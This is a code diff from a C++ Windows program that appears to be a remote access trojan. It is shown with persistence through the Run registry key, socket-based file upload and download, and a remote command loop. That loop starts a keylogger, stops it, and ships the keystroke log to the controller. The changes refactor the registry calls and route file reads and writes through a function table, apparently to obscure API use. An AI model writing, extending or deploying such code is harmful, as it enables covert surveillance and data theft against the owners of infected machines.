@@ -3,11 +3,10 @@
 //
 #include "Connection.h"
 
+
 Connection::Connection(string ip, unsigned int port) {
     Connection::ip = ip;
     Connection::port = port;
-
-
 }
 
 int Connection::boot() {
@@ -21,7 +20,7 @@ int Connection::boot() {
         return -1;
     }
     HKEY NewVal;
-    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) !=
+    if (RegOpenKeyA(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) !=
         ERROR_SUCCESS) {
         cerr << "Cant open the registry" << endl;
         return -1;
@@ -29,7 +28,7 @@ int Connection::boot() {
 
 
     DWORD pathLenInBytes = pathLen * sizeof(*szPath);
-    if (RegSetValueEx(NewVal, TEXT("E"), 0, REG_SZ, (LPBYTE) szPath, pathLenInBytes) != ERROR_SUCCESS) {
+    if (RegSetValueExA(NewVal, TEXT("E"), 0, REG_SZ, (LPBYTE) szPath, pathLenInBytes) != ERROR_SUCCESS) {
         RegCloseKey(NewVal);
         return -1;
     }
@@ -97,7 +96,7 @@ void Connection::sendFile(string path) {
     send(sock, sizeToSend.c_str(), 15, 0);
 
     while (bytesRead != 0) {
-        ::ReadFile(hFile, buffer.data(), BUFFER_SIZE, &bytesRead, NULL);
+        functions->ReadFile_Function(hFile, buffer.data(), BUFFER_SIZE, &bytesRead, NULL);
         send(sock, buffer.data(), bytesRead, 0);
         totalReadData += bytesRead;
     }
@@ -149,7 +148,7 @@ void Connection::recvFile(string path) {
         cout << "size is " << size << endl;
         cout << "Data length is " << size << endl;
         totalFileSize += size;
-        ::WriteFile(hFile, buffer.data(), size, NULL, NULL);
+        functions->WriteFile_Function(hFile, buffer.data(), size, NULL, NULL);
         cout << totalFileSize << endl;
     }
     CloseHandle(hFile);
@@ -337,14 +336,12 @@ void Connection::connection() {
             sendMessage("The keylogger has started");
             continue;
         } else if (!command.rfind("stop keylogger")) {
-            if(!keylogger->run){
+            if (!keylogger->run) {
                 cout << "The keylogger is already stopped" << endl;
                 sendMessage("The keylogger is already stopped");
                 continue;
             }
             keylogger->run = false;
-            keylogger->file.flush();
-            keylogger->file.close();
             sendMessage("The keylogger has stoped");
             sendFile("C:\\C_projects\\Keylogger.txt");
             continue;
